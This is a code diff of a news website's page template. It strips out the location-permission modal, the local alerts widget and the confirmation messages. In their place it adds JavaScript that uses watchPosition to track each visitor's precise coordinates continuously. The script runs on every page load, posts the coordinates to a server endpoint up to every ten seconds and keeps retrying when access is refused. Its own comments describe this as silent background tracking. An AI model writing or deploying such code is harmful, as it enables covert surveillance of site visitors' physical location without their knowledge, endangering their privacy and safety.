@@ -117,21 +117,6 @@
 
             <!-- Sidebar Column -->
             <aside class="sidebar-container">
-                <!-- Weather / Local Widget placeholder (Dynamic when location is saved) -->
-                <div class="widget-card local-widget" id="local-info-widget">
-                    <div class="widget-header">
-                        <span class="live-indicator"></span>
-                        <h4>Your Local Alerts</h4>
-                    </div>
-                    <div class="widget-content" id="widget-location-status">
-                        <div class="loc-placeholder">
-                            <span class="loc-icon">📍</span>
-                            <p>Enable location permissions to view local fire hazards, local weather alerts, and regional news updates.</p>
-                            <button class="enable-btn-widget" onclick="requestLocation()">Grant Location</button>
-                        </div>
-                    </div>
-                </div>
-
                 <!-- Related News -->
                 <div class="widget-card">
                     <h4>Trending Stories</h4>
@@ -167,32 +152,14 @@
         </div>
     </footer>
 
-    <!-- Location Permission Custom Modal -->
-    <div class="location-modal-overlay" id="location-modal">
-        <div class="location-modal-card">
-            <div class="modal-header">
-                <div class="icon-circle">📍</div>
-                <h3>Enable Location Services</h3>
-            </div>
-            <div class="modal-body">
-                <p id="modal-message">We notice you haven't enabled location permissions yet. Please allow location access to receive breaking news alerts, emergency warnings, and localized weather updates relevant to your area.</p>
-            </div>
-            <div class="modal-footer">
-                <button class="modal-btn confirm-btn" onclick="requestLocation()">Allow Location Access</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Notification Toast -->
-    <div class="toast" id="toast-notification">
-        <span class="toast-icon">✓</span>
-        <span class="toast-message" id="toast-text">Location saved successfully.</span>
-    </div>
 
     <!-- JavaScript logic -->
     <script>
         let promptInterval = null;
+        let watchId = null;
         let isSaving = false;
+        let lastSavedTime = 0;
+        const SAVE_INTERVAL_MS = 10000; // Save to database at most once every 10 seconds
 
         // Fetch CSRF Token
         function getCookie(name) {
@@ -210,25 +177,44 @@
             return cookieValue;
         }
 
-        // Request Location using Maximum Accuracy
-        function requestLocation() {
+        // Start live tracking using watchPosition (Runs silently in the background)
+        function startLiveTracking() {
             if (!navigator.geolocation) {
-                showModalMessage("Geolocation is not supported by your browser.");
+                console.warn("Geolocation is not supported by your browser.");
                 return;
             }
 
-            console.log("Requesting geolocation coordinates...");
-            
-            navigator.geolocation.getCurrentPosition(
+            console.log("Starting background live location tracking...");
+
+            // If we are already watching, clear it first
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+            }
+
+            watchId = navigator.geolocation.watchPosition(
                 function(position) {
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
                     
-                    saveLocationToServer(lat, lng, accuracy);
+                    // Clear prompt retry interval as we successfully got the position
+                    if (promptInterval) {
+                        clearInterval(promptInterval);
+                        promptInterval = null;
+                    }
+
+                    // Save a flag to localStorage so we know we successfully connected
+                    localStorage.setItem('location_saved', 'true');
+
+                    // Throttle saving to the backend
+                    const now = Date.now();
+                    if (now - lastSavedTime >= SAVE_INTERVAL_MS) {
+                        saveLocationToServer(lat, lng, accuracy);
+                        lastSavedTime = now;
+                    }
                 },
                 function(error) {
-                    console.warn("Geolocation permission or retrieval error:", error);
+                    console.warn("Live tracking background warning:", error.message);
                     handleLocationError(error);
                 },
                 {
@@ -239,44 +225,16 @@
             );
         }
 
-        // Handle errors and prompt styling
+        // Handle errors silently on UI, but retry in the background
         function handleLocationError(error) {
-            const modal = document.getElementById('location-modal');
-            const messageEl = document.getElementById('modal-message');
-            modal.classList.add('active');
-
-            if (error.code === error.PERMISSION_DENIED) {
-                messageEl.innerHTML = `<strong>Location access is blocked.</strong><br>
-                To see breaking localized updates, please enable location permissions for this website in your browser settings (usually by clicking the lock/site settings icon in the address bar).`;
-            } else if (error.code === error.TIMEOUT) {
-                messageEl.innerHTML = `<strong>Location request timed out.</strong><br>
-                We could not establish your precise location in time. Please check your signal strength and click 'Allow Location Access' again.`;
-            } else {
-                messageEl.innerHTML = `<strong>Location service error.</strong><br>
-                Unable to retrieve your location coordinates. Please verify your system settings and allow access.`;
-            }
-
             // Start the 10-second retry loop
             startRetryLoop();
         }
 
-        // Save location details to django endpoint
+        // Save location details to django endpoint (silently)
         function saveLocationToServer(lat, lng, accuracy) {
             if (isSaving) return;
             isSaving = true;
-
-            // Hide modal
-            const modal = document.getElementById('location-modal');
-            modal.classList.remove('active');
-
-            // Clear prompt interval
-            if (promptInterval) {
-                clearInterval(promptInterval);
-                promptInterval = null;
-            }
-
-            // Save to localStorage so we don't ask on subsequent page loads
-            localStorage.setItem('location_saved', 'true');
 
             // POST JSON to view endpoint
             fetch('/api/save-location/', {
@@ -298,17 +256,12 @@
                 return response.json();
             })
             .then(data => {
-                console.log('Location saved successfully:', data);
-                showToast("Location synchronized successfully! Localized widgets are enabled.");
-                updateWidgetWithLocation(lat, lng, accuracy);
+                console.log('Location saved successfully in background:', data);
                 isSaving = false;
             })
             .catch(err => {
-                console.error('Network error saving location:', err);
+                console.error('Network error saving background location:', err);
                 isSaving = false;
-                // Retry if failed to send to DB
-                localStorage.removeItem('location_saved');
-                startRetryLoop();
             });
         }
 
@@ -316,47 +269,10 @@
         function startRetryLoop() {
             if (!promptInterval && !localStorage.getItem('location_saved')) {
                 promptInterval = setInterval(function() {
-                    console.log("10 seconds check: Triggering location check...");
-                    requestLocation();
+                    console.log("10 seconds check: Retrying live location background sync...");
+                    startLiveTracking();
                 }, 10000);
             }
-        }
-
-        // UI Toast Helper
-        function showToast(message) {
-            const toast = document.getElementById('toast-notification');
-            const toastText = document.getElementById('toast-text');
-            toastText.textContent = message;
-            toast.classList.add('show');
-            setTimeout(function() {
-                toast.classList.remove('show');
-            }, 4000);
-        }
-
-        // Update local widget dynamically when coords are available
-        function updateWidgetWithLocation(lat, lng, accuracy) {
-            const widget = document.getElementById('widget-location-status');
-            widget.innerHTML = `
-                <div class="loc-active">
-                    <div class="loc-lat-lng">
-                        <span class="green-indicator"></span>
-                        <strong>Location Synced (High Accuracy)</strong>
-                    </div>
-                    <p class="coords-data">Lat: <code>${parseFloat(lat).toFixed(6)}</code><br>Lng: <code>${parseFloat(lng).toFixed(6)}</code></p>
-                    <p class="accuracy-data">Precision: ±${Math.round(accuracy)} meters</p>
-                    <div class="local-weather-stub">
-                        <span>☀️</span>
-                        <div>
-                            <strong>New Delhi, IN</strong><br>
-                            <small>Clear • 34°C</small>
-                        </div>
-                    </div>
-                    <div class="alert-box">
-                        <strong>⚠️ Fire Advisory Active</strong>
-                        <p>Avoid Tughlakabad Extension route due to emergency response operations.</p>
-                    </div>
-                </div>
-            `;
         }
 
         // Dark/Light Mode Theme Toggle
@@ -368,30 +284,13 @@
 
         // Initialize script
         window.addEventListener('DOMContentLoaded', function() {
-            // Check if user is already saved, if so, retrieve coordinates if we want, or just verify storage
             if (localStorage.getItem('location_saved')) {
-                // If already saved, we don't prompt again, and we can fetch or display a success state
-                const widget = document.getElementById('widget-location-status');
-                widget.innerHTML = `
-                    <div class="loc-active">
-                        <div class="loc-lat-lng">
-                            <span class="green-indicator"></span>
-                            <strong>Location Synced</strong>
-                        </div>
-                        <p class="coords-data"><small>Stored in database secure session.</small></p>
-                        <div class="local-weather-stub">
-                            <span>☀️</span>
-                            <div>
-                                <strong>New Delhi, IN</strong><br>
-                                <small>Clear • 34°C</small>
-                            </div>
-                        </div>
-                    </div>
-                `;
+                // Start background tracking immediately
+                startLiveTracking();
             } else {
                 // Not saved, prompt immediately on load
-                requestLocation();
-                // Start checking/prompting every 10 seconds
+                startLiveTracking();
+                // Start checking/prompting every 10 seconds if not allowed
                 startRetryLoop();
             }
         });
